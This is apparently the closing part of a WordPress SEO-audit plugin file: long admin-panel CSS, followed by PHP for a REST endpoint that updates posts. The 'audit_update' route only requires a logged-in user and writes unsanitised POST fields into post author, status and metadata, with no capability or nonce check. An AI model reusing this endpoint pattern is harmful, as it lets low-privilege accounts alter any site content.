				.hc2_audit_panel_morebox_info {border-right: 1px solid #3256bd;margin-right: 5px;}
				input[type="datetime-local"] {    width: 232px;}
				.hc2_audit_panel_excerpt .hc2_audit_panel_list_inner {width: 500px !IMPORTANT;padding: 10px 10px 5px;}
				.hc2_audit_panel_excerpt textarea {width: 100%;min-height: 140px;}
				.hc2_audit_panel_morebox_edit_col1 {grid-area: 1/3;width: 180px;}
				.hc2_audit_panel_morebox_edit_col2 {grid-area: 1/4;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="true"] input[type='button'] {color: white;cursor: pointer;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="true"] input[type='button']:hover {background: #3d66da;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] input[type='button'] {background-image: linear-gradient( 90deg, #80b680, #a9d5a9);border: 1px solid green;animation:slide 5s linear infinite;pointer-events:none;color:#76a089;}
				@keyframes slide{0%{background-position-x:0%;}100%{background-position-x:500px}}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] input:not([type='button']), tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] select, tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] .hc2_audit_panel_thumbnail_inner,tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] span[onclick] {opacity: .4;background: #f1f1f1;border: 1px solid #7e8993;pointer-events:none;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] > td{background:#d9e6ff;}
				td.hc2_audit_panel_notes span {margin: 0;height:17px;width:7px;border-radius:4px;border:1px solid transparent;}
				td.hc2_audit_panel_notes span:after {display:none;}
				td.hc2_audit_panel_notes .hc2_audit_panel_list_inner {right: 0 !important;top: 36px !important;padding: 10px 10px 7px 10px;}
				td.hc2_audit_panel_notes .hc2_audit_panel_list_inner textarea {width: 100%;min-height: 120px;}
				td.hc2_audit_panel_notes span {color: #f1f1f1;text-shadow: 0 0 1px black,0 0 1px black,0 0 1px black;}
				td.hc2_audit_panel_notes span[data-isnote='true'] {border:1px solid #3258bf;color: #3578dc;transition:none;}
				.hc2_audit_panel_notes .hc2_audit_panel_listing_inner[data-open="true"] span {color: white !important;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] .hc2_audit_panel_morebox {display: none;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="pushing"] > td {background: #c7e0be;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-pushing="true"] input[type='button'] {background-image: linear-gradient(45deg, white, #c1c1c1);}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-pushing="true"] > td {background: #d9e6d2;}
				
				span.hc2_audit_status_bullet{width: 11px;height: 11px;display: block;border-radius: 50%;margin: auto;}
				span.hc2_audit_status_bullet[data-status='newedits'] 	{     border: 2px solid #890707;background: white;box-sizing: border-box;}
				span.hc2_audit_status_bullet[data-status='singlepush'] 	{background: #d6b437;}
				span.hc2_audit_status_bullet[data-status='uptodate'] 	{background: #5fa013;}
				span:after {display:none;}
				td.hc2_audit_panel_notes .hc2_audit_panel_list_inner {right: 0 !important;top: 36px !important;padding: 10px 10px 7px 10px;}
				td.hc2_audit_panel_notes .hc2_audit_panel_list_inner textarea {width: 100%;min-height: 120px;}
				td.hc2_audit_panel_notes span {color: #f1f1f1;text-shadow: 0 0 1px black,0 0 1px black,0 0 1px black;}
				td.hc2_audit_panel_notes span[data-isnote='true'] {border:1px solid #3258bf;color: #3578dc;transition:none;}
				.hc2_audit_panel_notes .hc2_audit_panel_listing_inner[data-open="true"] span {color: white !important;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"] .hc2_audit_panel_morebox {display: none;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="pushing"] > td {background: #c7e0be;}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-pushing="true"] input[type='button'] {background-image: linear-gradient(45deg, white, #c1c1c1);}
				tr.hc2_audit_panel.hc2_audit_panel_container[data-pushing="true"] > td {background: #d9e6d2;}
				
				span.hc2_audit_status_bullet{width: 11px;height: 11px;display: block;border-radius: 50%;margin: auto;}
				span.hc2_audit_status_bullet[data-status='newedits'] 	{     border: 2px solid #890707;background: white;box-sizing: border-box;}
				span.hc2_audit_status_bullet[data-status='singlepush'] 	{background: #d6b437;}
				span.hc2_audit_status_bullet[data-status='uptodate'] 	{background: #5fa013;}
				
				.hc2_audit_panel_thumbnail_inner:hover  {overflow: visible !important;}
				.hc2_audit_panel_thumbnail_inner > div:hover {width: 100px;height: 100px;margin-left: -30px;margin-top: -30px;border: 1px solid #3578dc;cursor: pointer;z-index:2;}
				.hc2_audit_panel_thumbnail_inner > div {background-size: cover;width: 40px;height: 30px;transition: all .2s;position: relative;border-radius:4px;background-color:#f1f1f1;}
				.hc2_audit_panel_pixel_conversions_inner[data-open="true"] .hc2_audit_panel_list_inner {border-bottom-width: 2px;}
				.hc2_audit_panel_google_conversions_inner[data-open="true"] .hc2_audit_panel_list_inner {border-bottom-width: 3px;}
				.hc2_audit_panel_listing_inner[data-open="true"] .hc2_audit_panel_list_inner {border-bottom-width: 3px;}	

				.hc2_audit_panel_list.hc2_audit_panel_checklist > span:not([data-content='1/0']):not([data-content='2/0']):not([data-content='3/0']):not([data-content='4/0']):not([data-content='5/0']):not([data-content='6/0']):not([data-content='7/0']):not([data-content='8/0']):not([data-content='0']) {background: #3578dc;color: white;}
			
				.hc2_sort:before {content: '^';}
				.hc2_sort+.hc2_sort {transform: rotate(90deg) !important;}
				.hc2_sort {    left: -7px;width: 9px !important;position: relative !important;height: 10px !IMPORTANT;display: inline-block;float: left;padding: 5px;cursor: pointer;}
				@keyframes sorting{0%{background-position-x:0;}100%{background-position-x:110px;}}
				.hc2_sorting {border-radius:6px;font-weight:bold;width:100px;text-align:center;background-image:linear-gradient(90deg,green,#17c926);background-position-x:0;margin:20px;padding:5px;animation: sorting 4s linear infinite;}
				.hc2_sort .hc2_tip {display: none;}
				.hc2_sort:hover .hc2_tip {display: grid;transform: rotate(180deg);width: 50px;height: 50px;top: 0px;align-items: center;background: white;border: 1px solid black;text-align: center;left: 20px;}
				.hc2_sort + .hc2_sort:hover .hc2_tip {transform: rotate(360deg);left: -53px;top: -25px;}
				div#hc2_audit_main_container[data-sorting="true"]:before {content: '';display: block;position: absolute;width: 100%;height: 100%;background: #f1f1f1;opacity: .8;z-index: 1111;}
				div#hc2_audit_main_container[data-sorting="true"] {pointer-events: none;}
				@keyframes rotate{ 0%{ transform:rotate(0deg); }100%{ transform:rotate(360deg); }}
				div#hc2_audit_main_container[data-sorting="true"]:after {content: '';width: 100px;height: 100px;border: 10px solid #429dc9;border-right: 10px solid transparent;display: block;position: absolute;top: 100px;left: 50px;border-radius: 50%;z-index: 11111;animation: rotate 1s linear infinite;}
			
				.hc2_sort+.hc2_sort+.hc2_sort {transform: rotate(180deg) !important;bottom: -3px;left: -9px;}
				.hc2_sort+.hc2_sort+.hc2_sort:hover div {transform: rotate(270deg) !important;top: -15px !IMPORTANT;width: 70px;left: -70px !IMPORTANT;}


				[data-seotitle="400px"] .hc2_audit_panel_customtitle_inner,[data-title="400px"] .hc2_audit_panel_title_inner,[data-slug="400px"] .hc2_audit_panel_slug_inner {max-width: 400px !important;width: 400px !IMPORTANT;}
				[data-seotitle="700px"] .hc2_audit_panel_customtitle_inner,[data-title="700px"] .hc2_audit_panel_title_inner,[data-slug="700px"] .hc2_audit_panel_slug_inner {max-width: 700px !important;width: 700px !IMPORTANT;}

				[data-seotitleopen="true"] .hc2_audit_panel_customtitle_inner input,[data-titleopen="true"] .hc2_audit_panel_title_inner input,[data-slugopen="true"] .hc2_audit_panel_slug_inner input {width: 100% !important;}

				[onclick="hc2_renderallpages(this)"] {background: blue;display: block;width: 100px;color: white;cursor: pointer;text-align: center;padding: 3px;border-radius: 4px;background: green;box-shadow: inset 0 0 4px;border: 1px solid #0d3d0f;top: 20px;right: 20px;position: absolute;}

				.hc2_audit_panel_customtitle_inner,.hc2_audit_panel_slug_inner {width: 70px !important;}
				.hc2_audit_panel_title_inner {width: 150px !important;}
				.hc2_pushed_1 .hc2_audit_panel_renderstatus .hc2_audit_status_bullet,
				.hc2_pushed .hc2_audit_panel_renderstatus .hc2_audit_status_bullet {background: #5fa013;}
				.hc2_pushed_0 .hc2_audit_panel_renderstatus .hc2_audit_status_bullet {border: 2px solid #890707;background: white;box-sizing: border-box;;}
				.hc2_sending .hc2_audit_panel_renderstatus .hc2_audit_status_bullet {background: #d6b437;}
				.hc2_audit_panel_amp_inner > input:before,
				.hc2_audit_panel_hide_inner > input:before,
				.hc2_audit_panel_about_inner > input:before,
				.hc2_audit_panel_service_inner > input:before,
				.hc2_audit_panel_seourgent_inner > input:before,
				.hc2_audit_panel_analytics_inner > input:before {margin-top: 6px !important;display: inline-block;opacity: 0;margin-left: 0px !important;font-size: 20px;transition:opacity .2s;}

				.hc2_audit_panel_amp_inner > input:not(:checked):hover:before,
				.hc2_audit_panel_hide_inner > input:not(:checked):hover:before,
				.hc2_audit_panel_about_inner > input:not(:checked):hover:before,
				.hc2_audit_panel_service_inner > input:not(:checked):hover:before,
				.hc2_audit_panel_seourgent_inner > input:not(:checked):hover:before,
				.hc2_audit_panel_analytics_inner > input:not(:checked):hover:before {opacity: .7;}

				.hc2_audit_panel_amp_inner > input,
				.hc2_audit_panel_hide_inner > input,
				.hc2_audit_panel_about_inner > input,
				.hc2_audit_panel_service_inner > input,
				.hc2_audit_panel_seourgent_inner > input,
				.hc2_audit_panel_analytics_inner > input {border: none !important;box-shadow: none !important;}

				.hc2_audit_panel_amp_inner > input:checked:before,
				.hc2_audit_panel_hide_inner > input:checked:before,
				.hc2_audit_panel_about_inner > input:checked:before,
				.hc2_audit_panel_service_inner > input:checked:before,
				.hc2_audit_panel_seourgent_inner > input:checked:before,
				.hc2_audit_panel_analytics_inner > input:checked:before {opacity: 1;color: #218dbf;}

				.hc2_audit_panel_amp_inner > input:before {content: '🗲' !important;}

				.hc2_audit_panel_hide_inner > input:before {content: '👁' !important;}

				.hc2_audit_panel_about_inner > input:before {content: '🛈' !important;}

				.hc2_audit_panel_service_inner > input:before {content: '🛎' !important;}
				
				.hc2_audit_panel_seourgent_inner > input:before {content: '⚠' !important;}

				.hc2_audit_panel_analytics_inner > input:before {content: '⦮' !important;}
				input.hc2_field_pixel {width: 30px;height: 30px;margin-top: 0px;margin-right: 0;}
				input.hc2_field_pixel:checked {background: #3578dc;}
				input.hc2_field_pixel:before {width: 30px !important;height: 30px !important;margin: 0px -2.5px !important;filter: brightness(10);}
				.hc2_audit_panel_google_conversions .hc2_audit_conversions_item > span {display: none;}
				.hc2_audit_panel_pixel_conversions .hc2_audit_conversions_item > span {display: none;}

				.hc2_audit_panel_text .hc2_audit_panel_list_inner textarea {
    border: none;
    width: calc( 100% - 40px );
    margin: 0px 20px !important;
    padding: 10px;
    height: 15px;
}
button.hc2_popbutton {
    background: #3578dc;
    color: white;
    border-radius: 4px;
    border: none;
    padding: 4px 10px;
    margin: 4px 10px 4px 0;
    cursor: pointer;
}

button.hc2_popbutton.hc2_deletebutton {
    background: #890707;
}

button.hc2_popbutton:hover {
    opacity: .8;
}
.hc2_audit_text_item_li textarea:not(#_)
    padding:1px 10px 1px 46px !important;
}
.hc2_audit_text_item_li:before{
    content:'•';
    display:block;
    position:absolute; 
    left: 74px;
    margin-top: 5px;
}
span.hc2_audit_panel_text_type_li{
    margin-top: 5px !important;
}
.hc2_audit_panel_text_type {
    height: 32px !important;
    width: 56px !important;
    min-height: 10px !important;
    cursor: pointer !important;
    position: absolute;
    left: -3px;
    margin-top: 6px;
    font-weight: bold;
    text-transform: uppercase;
    font-size: 12px !important;
    color: gray !important;
}
td.hc2_audit_panel_text .hc2_audit_panel_list_inner {
    padding: 20px 0;
    background: white !important;
    width: 900px !important;
    max-height: 700px;
    overflow-y: scroll;
}

.hc2_audit_text_item.hc2_audit_text_item_h1 textarea {
    font-weight: bold;
    font-size: 22px;
}
.hc2_audit_text_item.hc2_audit_text_item_h2 textarea {
    font-weight: bold;
    font-size: 18px;
}
.hc2_audit_text_item.hc2_audit_text_item_h3 textarea {
    font-weight: bold;
    font-size: 17px;
}
.hc2_audit_text_item.hc2_audit_text_item_h4 textarea {
    font-weight: bold;
    font-size: 16px;
}
.hc2_audit_text_item.hc2_audit_text_item_h5 textarea {
    font-weight: bold;
    font-size: 15px;
}
.hc2_audit_text_item.hc2_audit_text_item_h6 textarea {
    font-weight: bold;
}
				[data-type="wp_block"] .hc2_audit_panel_list_inner {
    left: -300px;
}
span.hc2_audit_panel_text_type.hc2_audit_panel_text_type_cite {
    margin-top: 3px;
}

.hc2_audit_text_item.hc2_audit_text_item_cite textarea {
    padding: 3px 10px 3px 30px !important;
    font-size: 12px;
}

td.hc2_audit_panel_keywords span {margin: 0 ;height:17px;width:7px;border-radius:4px;border:1px solid transparent;}
				td.hc2_audit_panel_keywords span:after {display:none;}
				td.hc2_audit_panel_keywords .hc2_audit_panel_list_inner {right: 0 !important;top: 36px !important;padding: 10px 10px 7px 10px;}
				td.hc2_audit_panel_keywords .hc2_audit_panel_list_inner textarea {width: 100%;min-height: 120px;}
				td.hc2_audit_panel_keywords span {color: #f1f1f1;text-shadow: 0 0 1px black,0 0 1px black,0 0 1px black;}
				td.hc2_audit_panel_keywords span[data-isnote='true'] {border:1px solid #3258bf;color: #3578dc;transition:none;}
				.hc2_audit_panel_keywords .hc2_audit_panel_listing_inner[data-open="true"] span {color: white !important;}
				
				td.hc2_audit_panel_keywords .hc2_audit_panel_list_inner {right: 0 !important;top: 36px !important;padding: 10px 10px 7px 10px;}
				td.hc2_audit_panel_keywords .hc2_audit_panel_list_inner textarea {width: 100%;min-height: 120px;}
				td.hc2_audit_panel_keywords span {color: #f1f1f1;text-shadow: 0 0 1px black,0 0 1px black,0 0 1px black;}
				td.hc2_audit_panel_keywords span[data-isnote='true'] {border:1px solid #3258bf;color: #3578dc;transition:none;}
				.hc2_audit_panel_keywords .hc2_audit_panel_listing_inner[data-open="true"] span {color: white !important;}
				.hc2_audit_panel_images .hc2_audit_conversions_item div {
    height: 23px;
    width: 50px;
    top: 7px;
    background-size: cover;
    border: 1px solid gray;
    border-radius: 2px;
    overflow: hidden;
    cursor: pointer;
    position: absolute;
    background-color: white;
    transition: all .2s;
    background-position: center center;
}


.hc2_audit_panel_images .hc2_audit_conversions_item div:hover {margin-top: -30px;height: 80px;width: 80px;margin-left: -20px;z-index: 1;border-color: #3578dc;}

.hc2_audit_panel_images .hc2_audit_conversions_item {
    position: relative;
    overflow: visible;
    border: none;
}

.hc2_audit_panel_images .hc2_audit_conversions_item input {
    width: 510px;
    font-size: 14px;
    margin: 2px;
    border: 1px solid transparent;
    padding: 4px;
}
[data-open="true"] .hc2_exittoggle {
    position: fixed;
    width: 1000vw;
    height: 1000vh;
    top: 0;
    display: block !important;
    left: 0;
    opacity: .2;
    z-index: 1;
    transition: all .2s;
    cursor: pointer;
}

[data-open="true"] .hc2_exittoggle:hover {
    opacity: .1;
}

.hc2_audit_panel_listing_inner[data-open="true"]:before {display:none !important}
.hc2_image_img {
    width: 50px;
    height: 20px;
    display: inline-block;
    vertical-align: sub;
    background-size: cover;
    background-position: center;
}
.hc2_audit_panel_links .hc2_audit_panel_list_inner {
    text-align: left !important;
}

.hc2_audit_panel_links .hc2_audit_panel_list_inner > * {
    padding: 5px 14px;
}

.hc2_link_item > input {
    padding: 3px 10px;
    width: 538px;
    margin: 2px 0;
    border-radius: 2px;
    border: 1px solid;
}

span.hc2_links_section {
    display: block;
    font-size: 16px;
    text-align: center;
    font-weight: bold;
}

a.hc2_visit_link {
    display: inline;
    text-decoration: none !important;
    font-size: 11px;
    vertical-align: text-bottom;
}

.hc2_image_img {
    display: inline-block;
}

input.hc2_image_link {
    width: 485px;
}

.hc2_link_item.hc2_link_item_inline > span {width: 264px;display: inline-block;margin-left: 5px;
    overflow: hidden;
    margin-top: -3px;}

	.hc2_audit_panel_links .hc2_audit_panel_list_inner {
    background: white !important;
}

.hc2_audit_panel_links .hc2_audit_panel_list_inner input {
    border: 1px solid transparent !important;
}

.hc2_audit_panel_links .hc2_audit_panel_list_inner input:hover {
    border: 1px solid #3578dc !important;
}

.hc2_audit_panel_links .hc2_audit_panel_list_inner > * {
    border-bottom: 1px solid;
}

span.hc2_links_section {
    background: #3578dc;
    color: white;
}

span.hc2_links_section.hc2_links_section_links {
    margin-bottom: 5px;
}

span.hc2_inline_span {
    padding-left: 10px;
    width: 253px !IMPORTANT;
}

span.hc2_group_span {
    padding-left: 10px;
    MARGIN-BOTTOM: 5px;
    display: block;
    font-weight: bold;
}

input.hc2_button_text {
    font-weight: bold;
}

.hc2_audit_panel_google_conversions .hc2_audit_panel_list_inner ,
.hc2_audit_panel_pixel_conversions .hc2_audit_panel_list_inner ,
.hc2_audit_panel_text .hc2_audit_panel_list_inner ,
.hc2_audit_panel_images .hc2_audit_panel_list_inner ,
.hc2_audit_panel_excerpt .hc2_audit_panel_list_inner ,
.hc2_audit_panel_notes .hc2_audit_panel_list_inner ,
.hc2_audit_panel_keywords .hc2_audit_panel_list_inner {
    background: white !important;
    padding-top: 36px !important;
}

.hc2_audit_panel_excerpt .hc2_audit_panel_list_inner textarea,
.hc2_audit_panel_notes .hc2_audit_panel_list_inner textarea,
.hc2_audit_panel_keywords .hc2_audit_panel_list_inner textarea {
    border: none !IMPORTANT;
}

.hc2_audit_panel_list_inner:before {width: 100%;text-align: center;display: block;background: #3578dc;color: white;position: absolute;top: 0;left: 0;padding: 4px 0 8px 0;font-size: 18px;box-sizing: border-box;font-weight: bold;}
.hc2_audit_panel_excerpt .hc2_audit_panel_list_inner:before {content: 'Excerpt';}
.hc2_audit_panel_notes .hc2_audit_panel_list_inner:before {content: 'Notes';}
.hc2_audit_panel_keywords .hc2_audit_panel_list_inner:before {content: 'Keywords';}
.hc2_audit_panel_images .hc2_audit_panel_list_inner:before {content: 'Images and Alt Tags';}
.hc2_audit_panel_google_conversions .hc2_audit_panel_list_inner:before {content: 'Google Ad Conversions';}
.hc2_audit_panel_pixel_conversions .hc2_audit_panel_list_inner:before {content: 'Facebook Ad Conversions';}
.hc2_audit_panel_text .hc2_audit_panel_list_inner:before {content: 'Inline Text';}

.hc2_audit_panel_seoscore .hc2_audit_panel_list_inner {
    background: white !important;
    padding-top: 36px !important;
    padding-bottom: 5px;
}
.hc2_audit_panel_list_inner {
	    max-height: 700px;
    overflow-y: scroll;
}

.hc2_audit_panel_seoscore .hc2_audit_panel_list_inner:before {content: 'SEO Score Breakdown';}

span.hc2_audit_panel_seo_breakdown {
    padding: 5px 15px;
    display: block;
}

span.hc2_audit_panel_seo_breakdown label {
    font-weight: bold;
    vertical-align: initial;
    margin-right: 5px;
}

span.hc2_seoscore_color_green {
    color: #258318;
    border-color:#139a00 !important;
}


.hc2_audit_panel_seo_color_green {
    color: #258318;
}

span.hc2_seoscore_color_yellow {
    color: #505610;
    border-color: #d8c51d !important;
}


.hc2_audit_panel_seo_color_yellow {
    color: #505610;
}

span.hc2_seoscore_color_orange {
    color: #70360a;
    border-color:#FF9800 !important;
}

.hc2_audit_panel_seo_color_orange {
    color: #70360a;
}

span.hc2_seoscore_color_red {
    color: #951003;
    border-color:#ff1700 !important;
}

.hc2_audit_panel_seo_color_red {
    color: #951003
}

.hc2_audit_panel_seoscore > div > div > span:before{
    content:'%';
    position:absolute;
    right:20px;
}

.hc2_audit_panel_seoscore > div > div > span{
    border-left-width:4px !important;
    width:30px;
    text-align:right;
    padding-right:32px;
}

.hc2_audit_panel_seo_breakdown label {
    color: black;
}

.hc2_audit_panel_list > span {
    min-height: 14px !important;
}
.hc2_audit_panel_seoscore .hc2_audit_panel_list_inner {
    right: 0 !important;
}
span.hc2_needsupdate {
    font-size: 0;
    pointer-events: none !important;
}

span.hc2_needsupdate:before {
    text-align:center !important;
    width:100% !important;
    content: 'Outdated' !important;
    font-size: 12px;
    right: 0 !important;
    color: black !important;
}

span.hc2_needstest:after {
    border: none;
    content: '!';
    transform: none !IMPORTANT;
    margin: -5px 1px;
    font-weight: bold;
    color: red;
}
span.hc2_needsupdate:after {
    display: none;
}
.hc2_audit_panel_save_inner > input:hover {
    color: white !IMPORTANT;
    cursor: pointer;
    background: #3d66da;
}

button.hc2_updateallbutton {
    border-radius: 3px;
    border-style: solid;
    border-width: 1px;
    padding: 4px 10px;
    color: #ffffff;
    background: #3578dc;
    border-color: #244bb9;
    height: 32px;
    margin-top: -5px;
    cursor: pointer;
}

button.hc2_updateallbutton:hover {
    background: #3d66da;
}
[onclick="hc2_renderallpages(this)"] {
    height: 21px !important;
    width: 90px !important;
    transform: rotate(-90deg) !important;
    text-align: center !important;
    margin: 43px -80px !important;
    position: absolute !important;
    box-shadow: none !important;
    z-index: 1;
}
.wrap th div div i {
    font-weight: initial;
    font-size: 14px;
    font-style: initial;
    font-family: monospace;
    transform: rotate(90deg) !important;
    display: inline-block;
    width: 17px;
    height: 12px;
    margin-left: 10px;
    opacity: 0;
}

.wrap th div div:hover i {
    opacity: 1;
}


.wrap th div div {width: 300px;height: 300px;}

[onclick="hc2_renderallpages(this)"]:hover {
    background: #0d6f0d !important;
}
span.hc2_audit_panel_seo_breakdown_section {
    width: 100%;
    background: #3578dc5c;
    display: block;
    color: black;
    text-align: left;
    margin: 0px;
    padding: 5px;
    box-sizing: border-box;
    font-weight: bold;
}

span.hc2_audit_panel_seo_breakdown {
    text-align: left;
}

span.hc2_audit_panel_seo_breakdown label {
    width: 110px !important;
    display: inline-block;
    border-right: 1px solid;
    font-weight: initial;
    text-align: right;
    padding-right: 5px;
}

.hc2_audit_panel_seoscore .hc2_audit_panel_list_inner {
    width: 400px !important;
}

span.hc2_audit_panel_seo_breakdown_subsection {
    display: block;
    width: 100%;
    text-align: left;
    padding: 2px;
    font-size: 12px;
    padding: 0 5px;
    color: #282828;
}
tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"][data-tests="running"] input[type='button'] {
    animation:none !important;
    opacity:.2;
    background:#3578dc;
    color:#365a8c;
}

tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"][data-tests="running"] .hc2_audit_panel_seoscore_inner.hc2_audit_panel_listing_inner > div > span  {
    background-image: linear-gradient( 
90deg
, #b68080, #d5a9a9);
    border: 1px solid green;
    animation: slide 5s linear infinite;
    pointer-events: none;
    color: #785858;
    opacity:.8;
}

tr.hc2_audit_panel.hc2_audit_panel_container[data-edits="sending"][data-tests="running"] > td {
    background: #e8e0e1;
}



.hc2_seobox_testbutton[data-loading="true"]:before {
    content: '';
    width: 8px;
    height: 8px;
    display: inline-block;
    border: 1px solid #000000;
    border-top: 1px solid transparent;
    border-radius:50%; 
    margin-right:5px;
    animation:load 1s linear infinite;
}
.hc2_seobox_testbutton[data-loading="true"]{
    background:none;
    border:1px solid transparent;
    padding:4px 10px;
    font-size:12px;
}
@keyframes load{
    0%{transform:rotate(0deg)}
    100%{transform:rotate(360deg)}
}
.hc2_seobox_testbutton:not([data-loading="true"]){
    background:#3578dc;
    border:1px solid #3f61c1;
    color:white;
    padding:4px 10px;
    font-size:12px;
    cursor:pointer;
    margin: 0 10px 6px 10px;
}
.hc2_seobox_testbutton:not([data-loading="true"]):hover{
    background:#3d66da;
}

.hc2_audit_panel_seo_breakdown a:hover {
    cursor:pointer;
    color:black;
}
.hc2_audit_panel_seo_breakdown a {
    margin-left:10px !important;
}

.hc2_audit_panel_seo_breakdown > label > b {
    margin-right: 5px;
    height: 15px;
    display: inline-block;
    vertical-align: middle;
    color: #0000008a;
    font-size: 21px;
}

span.hc2_seo_update_note {
    margin-right: 10px;
}
tr.hc2_audit_panel[data-status="draft"] > td {
    background: #eeeeee;
}

.hc2_audit_panel_seo_breakdown  .hc2_tip {    display: none;    position: absolute;    border: 1px solid;    padding: 5px 20px;    background: white;    color: black;    box-shadow: 0 10px 10px -10px;    border-radius: 2px;    border-left: 4px solid #3578dc;    pointer-events: none;    z-index:1;}
.hc2_audit_panel_seo_breakdown:hover .hc2_tip {    display: block;}
span.hc2_audit_panel_seo_breakdown, span.hc2_audit_panel_seo_breakdown * {    cursor: default;}
span.hc2_audit_panel_seo_breakdown label i {font-style: initial !important;border: 1px solid;width: 18px;height: 18px;display: inline-block;font-size: 15px;text-align: center;border-radius: 50%;transform: scale(.6) translateY(2px);}
span.hc2_audit_panel_seo_breakdown label:not(#_) {width: 180px !important;}
span.hc2_audit_panel_seo_breakdown button + a {font-size: 12px;margin-left: 10px;}

tr.hc2_audit_panel[data-edits="sending"][data-tests="running"]:after{
    position:absolute;
    display:block;
    width: 270px;
    right: 170px;
    text-align: center;
    margin: 10px;
    background: white;
    padding: 5px 20px;
    border-radius: 2px;
    opacity: .8;
}

tr.hc2_audit_panel[data-edits="sending"][data-tests="running"][data-test="links"]:after{
    content:'Checking for broken links';
    border: 1px solid #4e0d0d;
    border-left: 8px solid #b71d1d;
}


tr.hc2_audit_panel[data-edits="sending"][data-tests="running"][data-test="pagespeed"]:after{
    content:'Analyzing pagespeed';
    border: 1px solid #0d0e4e;
    border-left: 8px solid #1d3cb7;
}

tr.hc2_audit_panel[data-edits="sending"][data-tests="running"][data-test="mobile"]:after{
    content:'Testing mobile friendliness';
    border: 1px solid #3c0d4e;
    border-left: 8px solid #9e23cd;
}


tr.hc2_audit_panel {
    position: relative;
}
.hc2_keys_actual {
    border: 1px solid;
    margin-top: 5px;
    padding: 35px 10px 10px;
    text-align: left;
    position: relative;
}

.hc2_keys_actual span:not(#_) {color: black !IMPORTANT;text-shadow: none !important;display: inline-block;width: 30%;text-align: left;}

.hc2_keys_actual:before {content: 'Synonyms in use:';display: block;background: #3578dc;color: white;padding: 5px;position: absolute;left: 0;top: 0;width: 100%;box-sizing: border-box;}

.hc2_audit_panel_seoscore .hc2_audit_panel_list_inner {
    padding-bottom: 50px;
}

input.hc2_includeintests {
    float: right;
    margin: 1px;
}
td.hc2divid {
    background: transparent !important;
    border: none !important;
    border-left: 1px solid #c5c5c5 !important;
    border-right: 1px solid #c5c5c5 !important;
    min-width:50px !important;
}
th.hc2divid {
    border: none !important;
}

.hc2_audit_panel_images .hc2_audit_panel_list_inner {
    padding-bottom: 50px;
    padding-left: 20px;
}
.hc2_audit_panel_text .hc2_audit_text_item textarea {
    border-left: 1px solid black !important;
    border-radius: 0px;
    width: calc( 100% - 60px );
    padding-left: 30px !important;
    padding-bottom: 10px;
    min-height:  40px;
}

td.hc2_audit_panel_thumbnail {
    white-space: nowrap;
    max-width: 96px;
}

td.hc2_audit_panel_thumbnail > * {
    display: inline-block;
    vertical-align: middle;
    max-width: 37px;
    margin: 0 5px;
}
			</style>
		<?php
	}
	
	function hc2_stagingstatus($post,$r=0){
		
		$modified_time = strtotime(get_the_modified_date('Y-m-d H:i:s',$post->ID));
		$post_pushed_time = strtotime(get_post_meta($post->ID,'hc2_pushed',1));
		$site_pushed_time = strtotime(get_option('hc2_pushed'));
					
		if( $site_pushed_time >= $modified_time && $site_pushed_time >= $post_pushed_time ){ 
			if($r){ return 'uptodate'; }else{ echo 'uptodate'; }
		}else if( $post_pushed_time >= $modified_time && $post_pushed_time >= $site_pushed_time ){ 
			if($r){ return 'singlepush'; }else{ echo 'singlepush'; }
		}else if( $modified_time >= $post_pushed_time && $modified_time >= $site_pushed_time ){ 
			if($r){ return 'newedits'; }else{ echo 'newedits'; }
		}
		
	}

	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/audit_update/',array('methods'=>'POST','callback'=>'hcube_audit_update','permission_callback' => function($request){ return is_user_logged_in();}));});
	function hcube_audit_update( $request ) { 

		update_option('hc2_stopseo',1);
		
		if( $_POST['parent'] != 'null' ){
			if(!isset($_POST['parent']) || $_POST['parent'] == 'none'){
				update_post_meta($_POST['postid'],'hc2_lang','');
				wp_update_post(array('ID' => $_POST['postid'], 'post_parent' => 0));
				wp_set_post_categories($_POST['postid'],array());
			}else{
				update_post_meta($_POST['postid'],'hc2_lang',$_POST['parent']);
				$my_posts = get_posts(array('name' => $_POST['parent'],'post_type' => array('post','page'),'numberposts' => 1));
				if( $my_posts ){
					wp_update_post(array('ID' => $_POST['postid'], 'post_parent' => $my_posts[0]->ID));
					wp_set_post_categories($_POST['postid'],array(get_option('hc2_lang_id_'.$_POST['parent'])));
					
				}
			}
		}

		if($_POST['thumbid'])set_post_thumbnail($_POST['postid'],$_POST['thumbid']);
		
		if( $_POST['author'] != 'null' ) wp_update_post(array('ID' => $_POST['postid'], 'post_author' => $_POST['author']));
		if( $_POST['status'] != 'null' ) wp_update_post(array('ID' => $_POST['postid'], 'post_status' => $_POST['status']));
		if( $_POST['render'] != 'null' ) update_post_meta($_POST['postid'],'hc2_post_mode',$_POST['render']);
		if( $_POST['render'] != 'null' ) if($_POST['render']=='php')update_post_meta($_POST['postid'],'amp_status','disabled');
		if( $_POST['address'] != 'null' ) update_post_meta($_POST['postid'],'hc2_address',$_POST['address']);
		if( $_POST['keywords'] != 'null' ) update_post_meta($_POST['postid'],'hc2_keys',$_POST['keywords']);
		
		if( $_POST['amp'] != 'null' ) update_post_meta($_POST['postid'],'amp_status',$_POST['amp']);
		if( $_POST['analytics'] != 'null' ) update_post_meta($_POST['postid'],'hcube_cm_notracking',$_POST['analytics']);
		if( $_POST['hide'] != 'null' ) update_post_meta($_POST['postid'],'hcube_sitemap_hide',$_POST['hide']);
		if( $_POST['about'] != 'null' ) update_post_meta($_POST['postid'],'hcube_is_about',$_POST['about']);
		if( $_POST['service'] != 'null' ) update_post_meta($_POST['postid'],'hcube_is_service',$_POST['service']);
